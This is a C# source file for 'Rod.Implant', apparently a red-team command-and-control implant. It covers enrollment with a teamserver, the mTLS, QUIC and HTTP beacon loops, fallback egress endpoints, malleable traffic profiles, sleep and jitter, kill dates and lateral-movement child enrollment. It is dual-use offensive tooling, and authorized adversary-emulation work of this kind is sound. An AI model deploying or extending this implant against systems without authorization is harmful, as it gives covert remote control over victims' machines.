// Rod.Implant is the reference .NET stage-2 implant. It enrolls
// into an engagement, opens the mTLS beacon stream, and runs the standard-
// category capability verbs the teamserver dispatches (architecture.md Sec 5,
// Sec 10.1). It is a benign reference: no evasion, no obfuscation, and no
// destructive behavior (architecture.md Sec 7); keyboard
// capture and LSASS dumping stay out-of-tree by the Sec 13 boundary. It proves
// the end-to-end slice -- enroll, beacon, task -- against the real teamserver
// and gives the .NET build unit something real to compile.

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Rod.Implant;
using Rod.Implant.Internal;

return await ImplantApp.RunAsync(args);

internal static class ImplantApp
{
    public static async Task<int> RunAsync(string[] args)
    {
        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        Config config;
        try
        {
            config = Config.ParseWithoutValidation(args);
        }
        catch (ExitProgramException ex)
        {
            // ExitProgramException carries an explicit message only when there is
            // something to print beyond what Config already wrote (e.g. -h already
            // printed usage). A null message means "already reported, stay quiet".
            if (ex.Message is { Length: > 0 } msg)
                Console.Error.WriteLine("rod-implant: " + msg);
            return ex.ExitCode;
        }

        // The profile baked in at build time (the generated BakedProfile
        // class) is authoritative for every operational key it carries: a
        // fielded artifact cannot be re-pointed or re-credentialed through
        // flags or the environment. An unbaked dev binary bakes nothing and
        // keeps its full flag/env configuration.
        BakedProfileSupport.ApplyBaked(config);

        // The required-field check runs after the bake: a fielded artifact
        // supplies its endpoint and credential there, and an unbaked run must
        // present them via flags or env.
        try
        {
            config.Validate();
        }
        catch (ExitProgramException ex)
        {
            Console.Error.WriteLine("rod-implant: " + ex.Message);
            return ex.ExitCode;
        }

        if (config.HasKillDate && DateTimeOffset.Now > config.KillDate)
        {
            Console.Error.WriteLine($"rod-implant: kill date {config.KillDate:O} has passed; refusing to run");
            return 1;
        }

        // The narration log: stderr while developing, a null sink when quiet.
        // Fatal paths below (refused enroll, dead beacon) print regardless --
        // an implant that dies silently is undebuggable -- but the running
        // implant's progress stays off the console of the host it runs on.
        var log = config.Quiet ? TextWriter.Null : Console.Error;

        // The implant owns its private key; only the public half crosses enroll
        // (architecture.md Sec 9). ECDSA P-256: first-run keygen is effectively
        // instantaneous where RSA-2048 costs ~100ms on-target, and the EC leaf
        // is the smaller certificate on the wire.
        log.WriteLine("rod-implant: generating implant keypair");
        using var privateKey = ECDsa.Create(ECCurve.NamedCurves.nistP256);

        var serverCAs = CACertLoader.LoadOptional(config.CACertPath);

        // The egress walk (architecture.md Sec 8): the primary endpoint plus the
        // baked fallbacks, shared by enroll and beacon so the entry that answers
        // enroll is the entry the first contact dials. A dead primary walks to
        // the next entry at both stages; the enrolled leaf -- the identity the
        // listener sees -- never changes across the walk.
        var egress = EgressEndpoints.Of(config);

        Enrollment enrollment;
        IAsyncDisposable? enrollConnection;
        try
        {
            (enrollment, enrollConnection) = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, log, cts.Token);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"rod-implant: enroll: {ex.Message}");
            return 1;
        }
        log.WriteLine($"rod-implant: enrolled: implant={enrollment.ImplantId} engagement={enrollment.EngagementId}");

        // The lateral.move handler re-enrolls a child against the same enroll path,
        // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
        // inputs and the parent's own id into the beacon's handler registry so a
        // can derive a child that enrolls back. The child's stager token arrives in
        // the task arguments, not here: this implant's own token is already spent.
        // The bundle's URL is the walk's current entry -- the front that just
        // answered enroll -- so a child derived while the primary is burned
        // enrolls at a live front.
        var enroll = new EnrollBundle
        {
            Url = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport),
            ParentId = enrollment.ImplantId,
            Profile = config.Transport,
            CAs = serverCAs,
        };

        // The contact clients follow the egress walk's URL shape
        // (architecture.md Sec 8): a web entry -- an http(s):// beacon URL --
        // runs the envelope POST cycle on that port; a bare host:port runs
        // the mTLS gRPC stream; a quic:// entry runs the QUIC stream. Which
        // modules exist at all is the baked
        // transport selection -- a build compiles only the clients its walk
        // can dial (Sec 8, the bake-time transport trim). Every client
        // shares the replay-nonce floor (Sec 9) and, through the one enroll
        // bundle, the fronted-pivot ledger, so a run that crosses shapes
        // keeps its accepted-nonce history and its fronted children. The
        // loop re-selects whenever a client yields its run, so the walk's
        // current entry always decides.
        var nonces = new TaskNonceTracker();
        // The held-task ledger (architecture.md Sec 10.3 -- the dispatch
        // strand): the dedup and result cache behind the receive-ack arm,
        // shared the same way, so a task dispatched on one carrier and
        // redelivered on another is recognized either way.
        var held = new HeldTaskLedger();
        // The live cadence: starts at the baked sleep/jitter pair, retunable at
        // run time through the beacon.sleep verb (shared by every contact
        // client covering this run).
        var cadence = new Cadence(config.Sleep, config.Jitter);
        // The QUIC enroll exchange's live connection (architecture.md Sec 8,
        // enrollment over QUIC), when the run opened one: it rides the setup
        // so the QUIC client's first cycle speaks its handshake on the same
        // stream the enroll rode. Every other shape (and a walk whose current
        // beacon entry outgrew it) leaves it unconsumed; the disposal at the
        // end is the no-op-or-harmless-close either way.
        var setup = new ContactSetup(config, enrollment, enroll, egress, nonces, held, log, cadence, enrollConnection);
        var clients = TransportSelection.CreateClients(setup);
        try
        {
            while (true)
            {
                var client = clients.FirstOrDefault(c => c.Serves(egress.CurrentBeaconUrl));
                if (client is null)
                {
                    // The walk reached an entry whose URL shape no compiled-in
                    // client carries (a single-shape bake walked onto the
                    // other shape's front). Say so and stop rather than dial
                    // the wrong client.
                    Console.Error.WriteLine(
                        $"rod-implant: no contact client for beacon URL '{egress.CurrentBeaconUrl}'");
                    return 1;
                }
                var exit = await client.RunAsync(cts.Token);
                if (exit == ContactExit.Terminate)
                    break;
            }
        }
        catch (OperationCanceledException)
        {
            // Clean shutdown via Ctrl-C.
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"rod-implant: beacon: {ex.Message}");
            return 1;
        }
        finally
        {
            if (enrollConnection is not null)
                await enrollConnection.DisposeAsync();
        }

        return 0;
    }

    // Enrolls with bounded retries: a transient failure (teamserver restarting,
    // network flap) backs off exponentially, while a definitive rejection (bad,
    // spent, or expired token, malformed response) fails immediately -- retrying
    // would not change that answer. Each retry advances the egress walk
    // (architecture.md Sec 8), so a burned primary is left behind on the first
    // failure rather than retried until the attempt budget is gone. Returns
    // the enrollment plus the live QUIC connection the exchange rode when the
    // answering entry was quic-schemed (null otherwise) -- the handoff the
    // first session cycle completes.
    private static async Task<(Enrollment Enrollment, IAsyncDisposable? Connection)> EnrollWithRetryAsync(
        EgressEndpoints egress,
        Config config,
        ECDsa privateKey,
        X509Certificate2Collection? serverCAs,
        TextWriter log,
        CancellationToken cancellationToken)
    {
        const int maxAttempts = 5;
        for (var attempt = 1; ; attempt++)
        {
            // The malleable transport profile (architecture.md Sec 7) shapes each
            // attempt: the current entry's host with the profiled enroll path.
            // A quic-schemed entry rides as baked -- the frame exchange's dial.
            var enrollUrl = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport);
            // Report the machine once at the first successful attempt's enroll:
            // the teamserver records it as this implant's device identity.
            var host = HostIdentity.Capture();
            var dial = new EnrollDial(
                enrollUrl,
                config.StagerToken,
                ParentImplantId: null,
                privateKey,
                serverCAs,
                config.Transport,
                Host: host,
                // The baked cadence rides the same report: the teamserver
                // records it as what this artifact runs until a handshake
                // advertises a retune.
                SleepSeconds: config.Sleep.TotalSeconds,
                JitterSeconds: config.Jitter.TotalSeconds,
                KillDate: config.HasKillDate ? config.KillDate.ToString("O") : null,
                Log: log);
            try
            {
                log.WriteLine($"rod-implant: enrolling at {enrollUrl}");
                var enrollment = await TransportSelection.EnrollAsync(dial, cancellationToken);
                return (enrollment, dial.OpenedConnection);
            }
            catch (C2.EnrollRejectedException)
            {
                throw;
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                if (attempt == maxAttempts)
                    throw;
                log.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
                egress.Advance();
                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(Math.Pow(2, attempt)), cancellationToken);
                }
                catch (OperationCanceledException)
                {
                    throw;
                }
            }
        }
    }
}

// Helpers split into small static classes so the top-level Program stays
// readable and each helper is independently testable. These are benign support
// code with no implant-only tradecraft.

internal static class CACertLoader
{
    // Loads an optional PEM-encoded CA bundle -- either a file path or the
    // PEM text itself (the baked profile carries the pinned CA inline) -- and
    // the implant pins it as the teamserver identity for the enroll TLS
    // connection. An empty value returns null (system roots / trust the chain
    // returned at enroll).
    public static X509Certificate2Collection? LoadOptional(string pathOrPem)
    {
        if (pathOrPem.Length == 0)
            return null;
        var collection = new X509Certificate2Collection();
        if (pathOrPem.Contains("-----BEGIN CERTIFICATE"))
            collection.ImportFromPem(pathOrPem);
        else
            collection.ImportFromPemFile(pathOrPem);
        if (collection.Count == 0)
            throw new InvalidOperationException($"no PEM certificates found in '{pathOrPem}'");
        return collection;
    }
}

internal static class Endpoints
{
    // Derives the beacon URL (host:port) from the enroll URL by stripping the
    // /implants/enroll path. Lets the operator pass a single endpoint.
    public static string BeaconUrlFromEnroll(string enrollUrl)
    {
        const string suffix = "/implants/enroll";
        var u = enrollUrl;
        if (u.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            u = u[..^suffix.Length];
        // The integration test passes "-beacon-url 127.0.0.1:port" explicitly, so
        // this derivation only matters when the two hosts coincide.
        return u;
    }
}

internal static class BakedProfileSupport
{
    // Applies the build-time baked profile (the generated BakedProfile
    // class, base64-URL JSON) OVER the parsed run-time configuration: every
    // operational key the bake carries is final, so a fielded artifact
    // cannot be re-pointed or re-credentialed through flags or the
    // environment -- what was built is what runs (architecture.md Sec 5.1).
    // Keys the bake omits keep their flag/env values, so an unbaked dev
    // binary stays fully configurable. Narration is the one deliberate
    // exception: quiet stays env-driven, because a debugging run's
    // ROD_QUIET=0 changes nothing about where the implant goes or what it
    // can do. Malformed baked data is ignored whole -- a bad bake must not
    // crash the implant, it just leaves the flag/env configuration in
    // force.
    public static void ApplyBaked(Config config, string? bakedJson = null)
    {
        var json = bakedJson ?? BakedProfile.Json;
        if (json.Length == 0)
            return;
        string raw;
        try
        {
            raw = DecodeBase64Url(json);
        }
        catch
        {
            return;
        }
        using var doc = System.Text.Json.JsonDocument.Parse(raw);
        var root = doc.RootElement;

        IfString(root, "enrollURL", value => config.EnrollURL = value);
        IfString(root, "beaconURL", value => config.BeaconURL = value);
        IfString(root, "token", value => config.StagerToken = value);
        // The pinned teamserver CA rides as the PEM text itself; the loader
        // accepts inline PEM or a file path under the same knob.
        IfString(root, "caCert", value => config.CACertPath = value);
        IfString(root, "mode", value => config.Mode = Config.NormalizeMode(value));
        IfString(root, "verbs", value => config.ClassVerbs = Config.ParseCommaList(value));
        IfDuration(root, "sleep", value => config.Sleep = value);
        IfDuration(root, "jitter", value => config.Jitter = value);
        // An empty kill date is the bake's open-ended shape and clears any
        // run-time fuse the same way an absent one never set it.
        IfKillDate(root, config);
        IfString(root, "enrollPath", value => config.Transport.EnrollPath = value);
        IfString(root, "userAgent", value => config.Transport.UserAgent = value);
        IfDuration(root, "requestTimeout", value => config.Transport.RequestTimeout = value);
        IfString(root, "envelope", value => config.Transport.Envelope = value);
        IfString(root, "envelopeKey", value => config.Transport.EnvelopeKey = value);
        IfString(root, "contactEnvelope", value => config.Transport.ContactEnvelope = value);
        if (root.TryGetProperty("headers", out var headers)
            && headers.ValueKind == System.Text.Json.JsonValueKind.Object)
        {
            config.Transport.Headers = DecodeHeaders(headers);
        }
        // The fallback endpoint list rides as a nested array
        // (architecture.md Sec 8): the ordered walk the egress follows when
        // the primary burns.
        if (root.TryGetProperty("fallbackEnrollURLs", out var fallbacks)
            && fallbacks.ValueKind == System.Text.Json.JsonValueKind.Array)
        {
            config.FallbackEnrollURLs = DecodeFallbacks(fallbacks);
        }
    }

    private static void IfString(
        System.Text.Json.JsonElement root, string key, Action<string> apply)
    {
        if (root.TryGetProperty(key, out var value)
            && value.ValueKind == System.Text.Json.JsonValueKind.String)
        {
            var s = value.GetString();
            if (!string.IsNullOrEmpty(s))
                apply(s);
        }
    }

    // The bake speaks the Go-duration shape the build contract defines
    // ("30s", "5m"); an unparseable or negative value leaves the parsed
    // configuration untouched rather than half-applying.
    private static void IfDuration(
        System.Text.Json.JsonElement root, string key, Action<TimeSpan> apply)
    {
        if (root.TryGetProperty(key, out var value)
            && value.ValueKind == System.Text.Json.JsonValueKind.String)
        {
            var parsed = Config.ParseGoDuration(value.GetString() ?? "", TimeSpan.MinValue);
            if (parsed != TimeSpan.MinValue && parsed >= TimeSpan.Zero)
                apply(parsed);
        }
    }

    private static void IfKillDate(System.Text.Json.JsonElement root, Config config)
    {
        if (!root.TryGetProperty("killDate", out var value)
            || value.ValueKind != System.Text.Json.JsonValueKind.String)
            return;
        var s = value.GetString();
        if (string.IsNullOrEmpty(s))
        {
            config.KillDate = DateTimeOffset.MinValue;
            return;
        }
        if (DateTimeOffset.TryParse(s, System.Globalization.CultureInfo.InvariantCulture,
                System.Globalization.DateTimeStyles.AssumeUniversal, out var parsed))
            config.KillDate = parsed;
    }

    private static IReadOnlyList<string> DecodeFallbacks(System.Text.Json.JsonElement array)
    {
        var urls = new List<string>();
        foreach (var item in array.EnumerateArray())
        {
            if (item.ValueKind != System.Text.Json.JsonValueKind.String)
                continue;
            var url = item.GetString();
            if (!string.IsNullOrWhiteSpace(url))
                urls.Add(url.Trim());
        }
        return urls;
    }

    private static Dictionary<string, string> DecodeHeaders(System.Text.Json.JsonElement obj)
    {
        var headers = new Dictionary<string, string>();
        foreach (var prop in obj.EnumerateObject())
        {
            headers[prop.Name] = prop.Value.ValueKind == System.Text.Json.JsonValueKind.String
                ? prop.Value.GetString() ?? string.Empty
                : prop.Value.GetRawText();
        }
        return headers;
    }

    private static string DecodeBase64Url(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight((padded.Length + 3) & ~3, '=');
        var bytes = Convert.FromBase64String(padded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }
}
